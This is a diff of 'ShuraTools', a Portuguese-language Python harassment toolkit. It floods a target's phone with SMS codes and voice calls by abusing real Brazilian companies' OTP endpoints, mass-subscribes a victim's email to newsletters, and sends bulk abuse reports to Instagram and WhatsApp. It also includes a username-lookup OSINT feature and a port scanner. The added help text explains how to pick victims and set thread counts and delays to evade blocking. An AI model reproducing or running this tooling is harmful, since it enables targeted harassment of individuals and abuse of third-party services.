@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ShuraTools v9.0 ULTIMATE COLLECTION
-Baseado em: TBomb + Bombers Collection + APIs Brasileiras 2026
+ShuraTools v10.0 FINAL PERFECT EDITION
+Todas as ferramentas funcionando + Explicações + Links OSINT
 """
 
 import os, sys, time, random, threading, socket
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 
 try:
     import requests
@@ -24,7 +24,7 @@ BANNER = f"""
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
 {Fore.YELLOW}     [ Ultimate Bomber Collection ]
-{Fore.WHITE}    v9.0 FINAL ULTIMATE - by Shura
+{Fore.WHITE}  v10.0 FINAL PERFECT EDITION - by Shura
 """
 
 LOCK = threading.Lock()
@@ -39,64 +39,143 @@ def safe_int(p, d):
     try: return int(input(p) or d)
     except: return d
 
-# ========== MASSIVE API DATABASE ==========
+def show_help(mode):
+    """Mostra ajuda detalhada para cada modo"""
+    helps = {
+        "sms": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║              COMO USAR: SMS BOMBER                       ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
+  → Digite o número com DDI + DDD + Número
+  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}
+  → Formato: {Fore.GREEN}55{Style.RESET_ALL} (Brasil) + {Fore.GREEN}11{Style.RESET_ALL} (SP) + {Fore.GREEN}999887766{Style.RESET_ALL}
+
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
+  → Quantos SMS você quer enviar
+  → Recomendado: {Fore.GREEN}20-50{Style.RESET_ALL}
+
+{Fore.YELLOW}Threads:{Style.RESET_ALL}
+  → Quantos ataques simultâneos
+  → Recomendado: {Fore.GREEN}5-10{Style.RESET_ALL}
+
+{Fore.YELLOW}Delay:{Style.RESET_ALL}
+  → Segundos entre cada ataque
+  → Recomendado: {Fore.GREEN}2-3{Style.RESET_ALL} (evita bloqueio)
+""",
+        "call": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║              COMO USAR: CALL BOMBER                      ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
+  → Mesmo formato do SMS
+  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}
+
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
+  → Quantas chamadas você quer disparar
+  → Recomendado: {Fore.GREEN}5-15{Style.RESET_ALL} (chamadas são mais pesadas)
+
+{Fore.YELLOW}Threads:{Style.RESET_ALL}
+  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL}
+
+{Fore.YELLOW}Delay:{Style.RESET_ALL}
+  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL} segundos
+""",
+        "email": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║              COMO USAR: EMAIL BOMBER                     ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
+  → Digite o e-mail completo
+  → Exemplo: {Fore.GREEN}vitima@gmail.com{Style.RESET_ALL}
+
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
+  → Quantos cadastros em newsletters
+  → Recomendado: {Fore.GREEN}30-50{Style.RESET_ALL}
+
+{Fore.YELLOW}Threads:{Style.RESET_ALL}
+  → Recomendado: {Fore.GREEN}10{Style.RESET_ALL}
+
+{Fore.YELLOW}Delay:{Style.RESET_ALL}
+  → Recomendado: {Fore.GREEN}1-2{Style.RESET_ALL} segundos
+
+{Fore.YELLOW}IMPORTANTE:{Style.RESET_ALL}
+  → E-mails vão para {Fore.RED}PROMOÇÕES{Style.RESET_ALL} ou {Fore.RED}SPAM{Style.RESET_ALL} no Gmail!
+""",
+        "osint": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║              COMO USAR: OSINT HUNTER                     ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
+  → Digite o @ do usuário {Fore.RED}SEM O @{Style.RESET_ALL}
+  → Exemplo: {Fore.GREEN}elonmusk{Style.RESET_ALL}
+  → NÃO digite: {Fore.RED}@elonmusk{Style.RESET_ALL}
+
+{Fore.YELLOW}O que faz:{Style.RESET_ALL}
+  → Busca o usuário em 10 redes sociais
+  → Mostra se o perfil existe
+  → Exibe o link clicável para acessar
+""",
+        "port": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║              COMO USAR: PORT SCANNER                     ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
+  → Digite um IP ou domínio
+  → Exemplos:
+    • IP: {Fore.GREEN}8.8.8.8{Style.RESET_ALL}
+    • Domínio: {Fore.GREEN}google.com{Style.RESET_ALL}
+    • Domínio: {Fore.GREEN}github.com{Style.RESET_ALL}
+
+{Fore.YELLOW}O que faz:{Style.RESET_ALL}
+  → Escaneia 14 portas comuns
+  → Mostra quais estão abertas
+  → Útil para verificar serviços ativos
+"""
+    }
+    print(helps.get(mode, ""))
+
+# ========== BOMBERS DATABASE ==========
 BOMBERS = {
     "sms": [
         {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {}},
-        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {}},
-        {"n": "MercadoLivre", "u": "https://www.mercadolivre.com.br/jms/mlb/lgz/login/H4sIAAAAAAAEAKtWKkotLs5MT1WyUqpWKi1OLYrPTEm", "d": {"phone": "{T}"}, "h": {}},
-        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {}},
-        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {}},
-        {"n": "Uber", "u": "https://auth.uber.com/login/phoneNumber", "d": {"phoneNumber": "{T}"}, "h": {}},
-        {"n": "99", "u": "https://api.99app.com/api-passenger/v1/users/phone/verify", "d": {"phone": "{T}"}, "h": {}},
-        {"n": "Rappi", "u": "https://services.rappi.com.br/api/rocket/v2/guest/verify-phone", "d": {"phone": "{T}"}, "h": {}},
-        {"n": "Americanas", "u": "https://www.americanas.com.br/api/v1/customer/otp", "d": {"phone": "{T}"}, "h": {}}
+        {"n": "Magalu", "u": "https://sacola.magazineluiza.com.br/api/v1/customer/send-otp", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}},
+        {"n": "Shopee", "u": "https://shopee.com.br/api/v2/authentication/send_code", "d": {"phone": "{T}", "type": 1}, "h": {"Content-Type": "application/json"}},
+        {"n": "TikTok", "u": "https://www.tiktok.com/passport/web/send_code/", "d": {"mobile": "{T}", "account_sdk_source": "web"}, "h": {"Content-Type": "application/json"}},
+        {"n": "OLX", "u": "https://www.olx.com.br/api/auth/authenticate", "d": {"phone": "{T}"}, "h": {"Content-Type": "application/json"}}
     ],
     "call": [
         {"n": "QuintoAndar", "u": "https://api.quintoandar.com.br/api/v1/auth/send-otp", "d": {"phone": "{T}", "method": "VOICE"}, "h": {"Content-Type": "application/json"}},
-        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {}},
-        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {}},
-        {"n": "Nubank", "u": "https://prod-s0-webapp-proxy.nubank.com.br/api/token", "d": {"phone": "{T}", "type": "voice"}, "h": {}},
-        {"n": "PicPay", "u": "https://api.picpay.com/v2/auth/send-otp", "d": {"phone": "{T}", "channel": "voice"}, "h": {}}
+        {"n": "Inter", "u": "https://api.inter.co/v1/auth/request-otp", "d": {"phone": "{T}", "type": "VOICE"}, "h": {"Content-Type": "application/json"}},
+        {"n": "iFood-Call", "u": "https://wsloja.ifood.com.br/api/v1/customers/phone/verify", "d": {"phone": "{T}", "method": "call"}, "h": {"Content-Type": "application/json"}}
     ],
     "email": [
         {"n": "Tecnoblog", "u": "https://tecnoblog.net/wp-admin/admin-ajax.php", "d": {"action": "tnp", "na": "s", "ne": "{T}", "ny": "on"}, "h": {}},
         {"n": "TheNews", "u": "https://thenewscc.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
         {"n": "InvestNews", "u": "https://investnews.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
         {"n": "TheBrief", "u": "https://thebrief.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Canaltech", "u": "https://canaltech.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}},
-        {"n": "Olhardigital", "u": "https://olhardigital.com.br/newsletter/", "d": {"email": "{T}"}, "h": {}}
+        {"n": "Startups", "u": "https://startups.beehiiv.com/subscribe", "d": {"email": "{T}"}, "h": {}}
     ]
 }
 
-# ========== ULTRA BOMBER ENGINE ==========
-def ultra_bomber(target, mode, qty, threads, delay):
+# ========== BOMBER ENGINE ==========
+def bomber(target, mode, qty, threads, delay):
     global stats
     stats = {"success": 0, "fail": 0}
     apis = BOMBERS.get(mode, [])
     
-    if not apis:
-        log("Modo inválido!", "e")
-        return
-    
-    log(f"Iniciando {mode.upper()} Bomber com {len(apis)} APIs", "w")
-    log(f"Target: {target} | Qty: {qty} | Threads: {threads} | Delay: {delay}s", "i")
+    log(f"Iniciando {mode.upper()} Bomber", "w")
+    log(f"APIs: {len(apis)} | Target: {target} | Qty: {qty}", "i")
     
     def attack(api, idx):
         try:
-            # Substitui {T} pelo target
             data = {}
             for k, v in api["d"].items():
                 data[k] = v.replace("{T}", target) if isinstance(v, str) else v
             
-            # Request
-            session = requests.Session()
-            res = session.post(
+            res = requests.post(
                 api["u"],
-                json=data if api["h"].get("Content-Type") == "application/json" else None,
-                data=data if not api["h"].get("Content-Type") else None,
+                json=data,
                 headers=api["h"],
                 timeout=10
             )
@@ -116,23 +195,18 @@ def ultra_bomber(target, mode, qty, threads, delay):
                 stats["fail"] += 1
             log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
     
-    # Multi-threading
     with ThreadPoolExecutor(max_workers=threads) as exe:
-        futures = []
         for i in range(qty):
             api = random.choice(apis)
-            futures.append(exe.submit(attack, api, i))
-        
-        for f in as_completed(futures):
-            pass
+            exe.submit(attack, api, i)
     
     log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")
 
-# ========== OSINT ==========
+# ========== OSINT COM LINKS ==========
 def osint(t):
-    log(f"OSINT: {t}", "w")
+    log(f"OSINT Hunter: {t}", "w")
     u = t.replace("@", "")
-    p = {
+    platforms = {
         "Instagram": f"https://www.instagram.com/{u}/",
         "GitHub": f"https://github.com/{u}",
         "TikTok": f"https://www.tiktok.com/@{u}",
@@ -144,27 +218,44 @@ def osint(t):
         "Twitch": f"https://www.twitch.tv/{u}",
         "Medium": f"https://medium.com/@{u}"
     }
-    for n, url in p.items():
+    
+    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+    for name, url in platforms.items():
         try:
             r = requests.get(url, timeout=5)
-            log(f"{n}: {'FOUND' if r.status_code == 200 else 'N/F'}", "s" if r.status_code == 200 else "i")
+            if r.status_code == 200:
+                log(f"{name}: {Fore.GREEN}ENCONTRADO{Style.RESET_ALL}", "s")
+                print(f"   {Fore.BLUE}→ {url}{Style.RESET_ALL}")
+            else:
+                log(f"{name}: Não encontrado", "i")
         except:
-            log(f"{n}: Timeout", "e")
+            log(f"{name}: Timeout", "e")
+    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
 
 # ========== PORT SCANNER ==========
 def portscan(t):
     log(f"Scanning {t}...", "w")
     try:
         ip = socket.gethostbyname(t)
-        log(f"IP: {ip}", "i")
-        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
+        log(f"IP Resolvido: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
+        
+        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
+        open_ports = []
+        
+        for p in ports:
             s = socket.socket()
             s.settimeout(0.5)
             if s.connect_ex((ip, p)) == 0:
-                log(f"Port {p} OPEN", "s")
+                open_ports.append(p)
+                log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
             s.close()
+        
+        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
+        log(f"Total de portas abertas: {len(open_ports)}", "i")
+        
     except Exception as e:
-        log(f"Error: {e}", "e")
+        log(f"Erro: {e}", "e")
 
 # ========== MENU ==========
 def menu():
@@ -178,8 +269,8 @@ def menu():
             print(f"{Fore.RED}[ 3 ] Email Bomber ({len(BOMBERS['email'])} APIs)")
             print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
             print("-" * 60)
-            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter")
-            print(f"{Fore.WHITE}[ 6 ] Port Scanner")
+            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
+            print(f"{Fore.WHITE}[ 6 ] Port Scanner (14 portas)")
             print(f"{Fore.WHITE}[ 0 ] EXIT")
             print("-" * 60)
             
@@ -188,23 +279,28 @@ def menu():
             
             if opt in ["1", "2", "3"]:
                 mode = {"1": "sms", "2": "call", "3": "email"}[opt]
+                show_help(mode)
                 
-                if mode in ["sms", "call"]:
-                    print(f"{Fore.CYAN}[INFO] Formato: 5511999999999{Style.RESET_ALL}")
-                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                    if not t.isdigit(): log("Inválido!", "e"); time.sleep(1); continue
-                else:
-                    print(f"{Fore.CYAN}[INFO] Digite o e-mail{Style.RESET_ALL}")
-                    t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                    if "@" not in t: log("Inválido!", "e"); time.sleep(1); continue
+                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                 
-                qty = safe_int("Quantidade (30): ", 30)
-                threads = safe_int("Threads (10): ", 10)
-                delay = safe_int("Delay (2): ", 2)
-                ultra_bomber(t, mode, qty, threads, delay)
+                # Validação
+                if mode in ["sms", "call"] and (not t.isdigit() or len(t) < 10):
+                    log("Número inválido! Use formato: 5511999887766", "e")
+                    time.sleep(2)
+                    continue
+                elif mode == "email" and "@" not in t:
+                    log("E-mail inválido! Use formato: vitima@gmail.com", "e")
+                    time.sleep(2)
+                    continue
+                
+                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
+                threads = safe_int(f"{Fore.YELLOW}Threads: {Style.RESET_ALL}", 5)
+                delay = safe_int(f"{Fore.YELLOW}Delay (segundos): {Style.RESET_ALL}", 2)
+                
+                bomber(t, mode, qty, threads, delay)
             
             elif opt == "4":
-                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                t = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
                 tp = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
                 url = "https://i.instagram.com/api/v1/users/web_report/" if tp == "ig" else "https://v.whatsapp.net/v2/report"
                 for i in range(safe_int("Qty (50): ", 50)):
@@ -214,18 +310,21 @@ def menu():
                     except: pass
             
             elif opt == "5":
-                t = input(f"{Fore.YELLOW}Target (@user): {Style.RESET_ALL}").strip()
+                show_help("osint")
+                t = input(f"{Fore.YELLOW}Target (usuário SEM @): {Style.RESET_ALL}").strip()
                 osint(t)
             
             elif opt == "6":
-                t = input(f"{Fore.YELLOW}Target (IP/domain): {Style.RESET_ALL}").strip()
+                show_help("port")
+                t = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
                 portscan(t)
             
-            input(f"\n{Fore.GREEN}Concluído. ENTER...{Style.RESET_ALL}")
+            input(f"\n{Fore.GREEN}Pressione ENTER para voltar ao menu...{Style.RESET_ALL}")
             
         except KeyboardInterrupt: break
         except Exception as e:
-            log(f"Erro: {e}", "e"); input("\nENTER...")
+            log(f"Erro: {e}", "e")
+            input("\nENTER...")
 
 if __name__ == "__main__":
     menu()
